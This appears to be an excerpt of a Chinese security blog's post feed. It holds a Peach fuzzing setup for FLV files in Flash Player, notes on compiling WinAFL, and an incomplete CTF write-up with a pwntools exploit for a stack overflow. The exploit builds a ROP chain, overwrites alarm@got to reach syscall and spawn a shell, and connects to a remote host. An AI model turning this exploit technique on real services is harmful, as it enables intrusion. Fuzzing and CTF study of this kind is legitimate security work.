<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Block</span> <span class="attr">name</span>=<span class="string">&quot;script&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18&quot;</span> <span class="attr">token</span>=<span class="string">&quot;true&quot;</span> <span class="attr">mutable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;datasize&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;timestamp&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;timestampi&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;streamid&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;firstbyte&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;data2&quot;</span> <span class="attr">lengthType</span>=<span class="string">&quot;calc&quot;</span> <span class="attr">length</span>=<span class="string">&quot;int(self.find(&#x27;datasize&#x27;).getInternalValue())-1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;lastsize&quot;</span> <span class="attr">size</span>=<span class="string">&quot;32&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这部分是audio tag部分的编写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Block</span> <span class="attr">name</span>=<span class="string">&quot;audio&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8&quot;</span> <span class="attr">token</span>=<span class="string">&quot;true&quot;</span> <span class="attr">mutable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;datasize1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;timestamp&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;timestampi&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;streamid&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Flags</span> <span class="attr">name</span>=<span class="string">&quot;Flag3&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;fmt&quot;</span> <span class="attr">position</span>=<span class="string">&quot;0&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;sr&quot;</span> <span class="attr">position</span>=<span class="string">&quot;4&quot;</span> <span class="attr">size</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;bits&quot;</span> <span class="attr">position</span>=<span class="string">&quot;6&quot;</span> <span class="attr">size</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;channels&quot;</span> <span class="attr">position</span>=<span class="string">&quot;7&quot;</span> <span class="attr">size</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">Flags</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Block</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Relation</span> <span class="attr">type</span>=<span class="string">&quot;when&quot;</span> <span class="attr">when</span>=<span class="string">&quot;int(self.find(&#x27;Flag3.fmt&#x27;).getInternalValue()) == 10&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;frmtype&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;data1&quot;</span> <span class="attr">lengthType</span>=<span class="string">&quot;calc&quot;</span> <span class="attr">length</span>=<span class="string">&quot;int(self.find(&#x27;datasize1&#x27;).getInternalValue())-2&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Block</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Relation</span> <span class="attr">type</span>=<span class="string">&quot;when&quot;</span> <span class="attr">when</span>=<span class="string">&quot;int(self.find(&#x27;Flag3.fmt&#x27;).getInternalValue()) != 10&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;data1&quot;</span> <span class="attr">lengthType</span>=<span class="string">&quot;calc&quot;</span> <span class="attr">length</span>=<span class="string">&quot;int(self.find(&#x27;datasize1&#x27;).getInternalValue())-1&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;lastsize&quot;</span> <span class="attr">size</span>=<span class="string">&quot;32&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这部分是video tag的部分的编写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Block</span> <span class="attr">name</span>=<span class="string">&quot;video&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">value</span>=<span class="string">&quot;9&quot;</span> <span class="attr">token</span>=<span class="string">&quot;true&quot;</span> <span class="attr">mutable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;datasize2&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;timestamp&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;timestampi&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;streamid&quot;</span> <span class="attr">size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Flags</span> <span class="attr">name</span>=<span class="string">&quot;Flag2&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;frmtype&quot;</span> <span class="attr">position</span>=<span class="string">&quot;0&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;codecid&quot;</span> <span class="attr">position</span>=<span class="string">&quot;4&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Flags</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Block</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">Relation</span> <span class="attr">type</span>=<span class="string">&quot;when&quot;</span> <span class="attr">when</span>=<span class="string">&quot;int(self.find(&#x27;Flag2.codecid&#x27;).getInternalValue()) == 7&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;pkttype&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;compotime&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;data&quot;</span> <span class="attr">lengthType</span>=<span class="string">&quot;calc&quot;</span> <span class="attr">length</span>=<span class="string">&quot;int(self.find(&#x27;datasize2&#x27;).getInternalValue())-5&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Block</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">Relation</span> <span class="attr">type</span>=<span class="string">&quot;when&quot;</span> <span class="attr">when</span>=<span class="string">&quot;int(self.find(&#x27;Flag2.codecid&#x27;).getInternalValue()) != 7&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Blob</span> <span class="attr">name</span>=<span class="string">&quot;data&quot;</span> <span class="attr">lengthType</span>=<span class="string">&quot;calc&quot;</span> <span class="attr">length</span>=<span class="string">&quot;int(self.find(&#x27;datasize2&#x27;).getInternalValue())-1&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;lastsize&quot;</span> <span class="attr">size</span>=<span class="string">&quot;32&quot;</span> <span class="attr">endian</span>=<span class="string">&quot;big&quot;</span> <span class="attr">signed</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Block</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="0x04-swf加载样本"><a href="#0x04-swf加载样本" class="headerlink" title="0x04: swf加载样本"></a>0x04: swf加载样本</h5><p>利用as语言编写的代码，编译后得到swf文件</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">package</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.display.Sprite;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.net.*;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.media.*;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.utils.*;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.display.*</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">import</span> flash.events.*;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.system.fscommand;</span></span><br><span class="line">    <span class="meta"><span class="meta-keyword">import</span> flash.display3D.textures.VideoTexture;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">Sprite</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Main</span><span class="params">()</span>:void</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> video:Video;</span><br><span class="line">            <span class="keyword">var</span> netCon:NetConnection;</span><br><span class="line">            <span class="keyword">var</span> stream:NetStream;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">loadVideo</span><span class="params">(url:String)</span>:Video</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                video = <span class="keyword">new</span> Video();</span><br><span class="line">                netCon = <span class="keyword">new</span> NetConnection();</span><br><span class="line">                netCon.connect(<span class="literal">null</span>);</span><br><span class="line">                stream = <span class="keyword">new</span> NetStream(netCon);</span><br><span class="line">                stream.play(url);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> client:Object = <span class="keyword">new</span> Object();</span><br><span class="line">                client.onMetaData = onMetaEvent;</span><br><span class="line">                stream.client = client;</span><br><span class="line"></span><br><span class="line">                stream.addEventListener(NetStatusEvent.NET_STATUS, netStatus);</span><br><span class="line">                video.attachNetStream(stream);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> video;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">onMetaEvent</span><span class="params">(e:Object)</span>:void</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">netStatus</span><span class="params">(e:NetStatusEvent)</span>:void</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                video.width  = stage.stageWidth;</span><br><span class="line">                video.height = stage.stageHeight;</span><br><span class="line">            &#125;</span><br><span class="line">            stage.addChild(loadVideo(<span class="string">&quot;fuzz.flv&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="0x05-自动化fuzz脚本"><a href="#0x05-自动化fuzz脚本" class="headerlink" title="0x05: 自动化fuzz脚本"></a>0x05: 自动化fuzz脚本</h5><p>核心部分的代码如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">fileID</span>):</span></span><br><span class="line">    copyFile(fileID)</span><br><span class="line">    subprocess.Popen(runCmd)</span><br><span class="line">    <span class="comment">#sleep(2)</span></span><br><span class="line">    checkCrash()</span><br><span class="line">    <span class="comment">#sleep(1)</span></span><br><span class="line">    clean()</span><br></pre></td></tr></table></figure>
<p>首先会拷贝一个样本文件到工作目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copyFile</span>(<span class="params">fileID</span>):</span></span><br><span class="line">    shutil.copyfile(fileDict.get(fileID),workDir+<span class="string">&quot;fuzz.flv&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>然后开始一轮的fuzz</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fuzzFilename = <span class="string">&quot;fuzz.swf&quot;</span></span><br><span class="line">programName = <span class="string">&quot;flashplayer_22_sa_debug.exe&quot;</span></span><br><span class="line">runCmd = programName +<span class="string">&quot; &quot;</span>+ fuzzFilename</span><br><span class="line">subprocess.Popen(runCmd)</span><br></pre></td></tr></table></figure>
<p>然后是异常检测(贼搓的方法…TAT)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkCrash</span>():</span></span><br><span class="line">    winDbg = <span class="string">&quot;windbg.exe&quot;</span></span><br><span class="line">    <span class="comment">#get process list</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        processList = psutil.process_iter()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processList:</span><br><span class="line">        <span class="keyword">if</span>(p.name == winDbg):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[#]Crash Found! Writing to log now ...&quot;</span></span><br><span class="line">            log(fileID)</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            p.kill()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span> </span><br></pre></td></tr></table></figure>
<p>最后就是收尾的工作了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span></span><br><span class="line">    subprocess.Popen(killProgram)<span class="comment">#kill programName for next one </span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(workDir+<span class="string">&quot;fuzz.flv&quot;</span>)):</span><br><span class="line">        os.remove(workDir+<span class="string">&quot;fuzz.flv&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="0x06-结束语"><a href="#0x06-结束语" class="headerlink" title="0x06: 结束语"></a>0x06: 结束语</h5><p>我这个东西只能叫toy吧，效率低下，简单粗暴。但是过程中是学习到不少东西，之后的打算是多看一些论文，多学习一些漏洞挖掘的方法，之前尝试了结合winafl来搞，不过问题很多，有待解决…慢慢来吧。<br>所有的东西我都丢github了，有啥错误欢迎各位师傅留言/email指导我 传送门在这里：<a href="https://github.com/o0xmuhe/filefmt_fuzz_with_peach">fuzz with peach</a></p>
<h5 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07: 参考"></a>0x07: 参考</h5><p><a href="http://blog.useasp.net/archive/2016/02/28/The-flv-video-file-format-specification-version-10-1.aspx">flv文件格式详解</a><br><a href="http://www.peachfuzzer.com/resources/peachcommunity/">peach 文档</a><br><a href="http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/">Fuzzing with Peach – Part 1 « Flinkd!</a></p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>peach</tag>
      </tags>
  </entry>
  <entry>
    <title>how to compile WinAFL</title>
    <url>/2016/10/29/how-to-compile-WinAFL/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h4><p>以前给自己挖了好多坑，结果就是现在要一个一个填，比如winafl的改造，需要重新编译，按照<code>github</code>上给出的方案编译遇到了问题，之后填了这个坑，这段时间又接触了相关的东西，就把这些东西拿出来记录一下，方便以后自己查看。</p>
<a id="more"></a>


<h4 id="0x01-遇到的问题"><a href="#0x01-遇到的问题" class="headerlink" title="0x01: 遇到的问题"></a>0x01: 遇到的问题</h4><p>之前的测试环境：</p>
<ul>
<li>   windows 10 x64</li>
<li>   vs 2015</li>
</ul>
<p>编译的方法：</p>
<pre><code>For a 32-bit build:</code></pre>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir build32</span><br><span class="line">cd build32</span><br><span class="line">cmake .. -DDynamoRIO_DIR&#x3D;..\path\to\DynamoRIO\cmake</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure>

<pre><code>For a 64-bit build:</code></pre>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir build64</span><br><span class="line">cd build64</span><br><span class="line">cmake -G&quot;Visual Studio 10 Win64&quot; .. -DDynamoRIO_DIR&#x3D;..\path\to\DynamoRIO\cmake</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure>

<pre><code>不过要注意，DR的路径一定要是绝对路径。</code></pre>
<p>然后遇到了这样的问题<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/compile_winafl/build_failed.png"></p>
<p>一堆的链接错误….</p>
<pre><code>出现这样的问题是因为你vs版本的问题，用2010就可以了。</code></pre>
<h4 id="0x02-正确的姿势"><a href="#0x02-正确的姿势" class="headerlink" title="0x02: 正确的姿势"></a>0x02: 正确的姿势</h4><p>首先上测试环境:</p>
<ul>
<li>   windows7 x64</li>
<li>   vs2010</li>
</ul>
<p>按照之前的方法编译，遇到了这样的一个问题。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/compile_winafl/failed.png"></p>
<p>这个是因为<code>是VS用来进行COFF格式转换的工具cvtres.exe被破坏了。</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cvtres.exe被破坏的原因是因为我刚装了.Net Framework，.Net Framework 自带了一个更新的cvtres.exe，却让原来VS2010中的cvtres.exe动不起来了。并且在VS编译时，VS自带的cvtres.exe在PATH环境变量的前面，所以COFF转换失败。</span><br><span class="line">知道原因就很好解决了:把VS2010中的两个cvtres.exe删掉或改名字，让VS可以使用.Net Framework 4.5安装的cvtres.exe，就OK了。</span><br></pre></td></tr></table></figure>
<p>再次编译</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/compile_winafl/bingo.png"></p>
<p>搞定了32位的编译，之后是64位的</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/compile_winafl/bingo64.png"></p>
<h4 id="0x03-结束语"><a href="#0x03-结束语" class="headerlink" title="0x03 : 结束语"></a>0x03 : 结束语</h4><p>现在已经可以编译了，也可以用vs调试了，这样就可以开始愉快的<code>winafl</code>改造工作了吧~</p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>winafl</tag>
      </tags>
  </entry>
  <entry>
    <title>ichunqiu-CTF-2017-2</title>
    <url>/2017/02/16/ichunqiu-CTF-2017-2/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>事后复现的，一些技巧也是第一次遇到。</p>
<a id="more"></a>

<h4 id="Black-hole"><a href="#Black-hole" class="headerlink" title="Black_hole"></a>Black_hole</h4><h6 id="1-vuln"><a href="#1-vuln" class="headerlink" title="1.vuln"></a>1.vuln</h6><p>主函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( check(<span class="number">96L</span>L, a2) == <span class="number">2333</span> )</span><br><span class="line">    vuln();</span><br><span class="line">  sub_4006F6();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞函数，栈溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [sp+0h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fread(&amp;ptr, <span class="number">1u</span>LL, <span class="number">32u</span>LL, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="2-tips"><a href="#2-tips" class="headerlink" title="2.tips"></a>2.tips</h6><p>不断ret到main函数，循环读取输入，写完payload之后，ret到ret这个gadgets，去执行ROP。<br>因为是动态链接x64的程序，所以ROP构造直接使用通型gadgets去构造。<br>程序没有leak，开始我的思路是读取很多，去使用ret2dlresolve的思路去搞，没搞好…<br>后来看了作者分享的exp，才发现可以：覆盖alarm@got最后一字节，爆破的手段，找到syscall…然后就是布置好寄存器，起shell了。</p>
<h6 id="3-exploit"><a href="#3-exploit" class="headerlink" title="3.exploit"></a>3.exploit</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;black_hole&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">    p = remote(<span class="string">&quot;106.75.66.195&quot;</span>,<span class="number">11003</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0000000000400704</span></span><br><span class="line">token = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_stack</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(token))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload = data.rjust(<span class="number">0x18</span>,<span class="string">&#x27;A&#x27;</span>) + p64(main_addr)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">gadget_1 = <span class="number">0x00000000004007A6</span></span><br><span class="line">gadget_2 = <span class="number">0x0000000000400790</span></span><br><span class="line"> </span><br><span class="line">addr_got_read = <span class="number">0x0000000000601028</span></span><br><span class="line">addr_bss = <span class="number">0x000000000601058</span></span><br><span class="line">addr_got_alarm = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>,Flag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> Flag:</span><br><span class="line">        pl = p64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">        pl += p64(<span class="number">0</span>)       <span class="comment"># for junk</span></span><br><span class="line">        pl += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">        pl += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">        pl += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">        pl += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">        pl += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">        pl += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">        pl += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 